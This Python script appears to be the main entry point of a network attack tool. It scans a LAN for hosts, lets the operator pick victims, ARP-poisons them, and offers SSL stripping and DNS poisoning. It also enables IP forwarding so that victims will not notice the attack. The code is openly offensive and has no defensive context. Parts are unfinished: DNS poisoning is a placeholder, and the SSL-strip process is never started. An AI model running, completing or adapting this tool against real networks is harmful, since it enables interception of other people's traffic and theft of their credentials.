import multiprocessing
import arp
import ssl
import scan
import parser
from urllib.parse import urlparse
import os
import sys

sslRequested = False


def is_valid_link(x):
    try:
        result = urlparse(x)
        return all([result.scheme, result.netloc])
    except:
        return False


def spacing():
    print("------------------------------------------------------------------\n")


# scan the network for hosts
def discover():
    interface = ' '
    hosts = ' '
    try:
        interface = scan.interface()
        if not interface:
            raise Exception
    except Exception:
        print("There was an issue with the interface.")
        sys.exit()

    if interface:
        try:
            hosts = scan.ip(interface)
            if not hosts:
                raise Exception
            else:
                print("Successful scanning on the interface", interface)
                spacing()
                print("Do you want to poison all the hosts?")
                answr = yes_no()

                if answr == 0:  # yes
                    print("Poisoning all hosts on the interface", interface)
                else:  # no

                    print(
                        "The following hosts are up and running. Pick the number of the host(s) you want to poison:")
                    counter = 1
                    for host in hosts:
                        print("[", counter, "] Host with IP",
                              host[0], "and MAC", host[1])
                        counter += 1

                    index = list(map(int, input().split()))

                    temp = [hosts[i-1] for i in index]
                    hosts = []
                    hosts = temp.copy()

        except Exception:
            print(
                "No hosts have been scanned in this interface. Configure some and try again.")
            sys.exit()

    return interface, hosts


def yes_no():

    def input_checker(val):
        # 0 -> yes
        # 1 -> no
        # everything else -> 2 - error, introduce again

        if val.lower() == 'yes' or val.lower() == 'y':
            return 0
        elif val.lower() == 'no' or val.lower() == 'n':
            return 1
        else:
            return 2

    answr = input()
    answr = input_checker(answr)

    while answr is 2:
        answr = input("We didn't quite catch that. Yes or no? \n")
        answr = input_checker(answr)

    return answr


interface, hosts = discover()
args = parser.import_args()

if args.ARP:
    interval = args.ARP
    spacing()

    # some threads around here i guess

    print("Want to do SSL strip on the victims while ARP poisoning them? Y/N")
    answr = yes_no()

    if answr is 0:
        sslRequested = True
        print("SSL Strip will be done")
    else:
        sslRequested = False
        print("No SSL strip.")

    spacing()

    # if silent

    if args.silent:
        print("Silent mode on. Forwarding intercepted packets to oiriginal destination")
        os.system("sysctl -w net.ipv4.ip_forward=1")
    else:
        print("Silent mode off. The victims might notice the attack and take measures against it.")
        os.system("sysctl -w net.ipv4.ip_forward=0")

    spacing()

    print("Begin ARP poisoning")

    spacing()

    arpAttack = arp.Poison(interface, hosts, interval)
    arpProcess = multiprocessing.Process(
        target=arpAttack.poison, name="ARP Poison")
    arpProcess.start()

    if sslRequested == True:
        ssl = ssl.SSLStrip()
        sslProcess = multiprocessing.Process(
            target=ssl.strip, name="SSL Strip")

elif args.DNS:
    websites = args.DNS

    no_issue = True  # check if there is an issue with one of the urls. assume there is no issue
    for url in websites:
        no_issue = no_issue and is_valid_link(url)

    if no_issue:
        # HERE YOU CALL DNS POISONING FUNCTION
        print(websites)
    else:
        print("Cannot begin DNS poisoning. One or more URLs were not correct.\n")
        print("------------------------------------------------------------------\n")
        for url in websites:
            if not is_valid_link(url):
                print(
                    "-", url, "is not a valid weblink. Did you append \"https://\" or \"http://\"?")
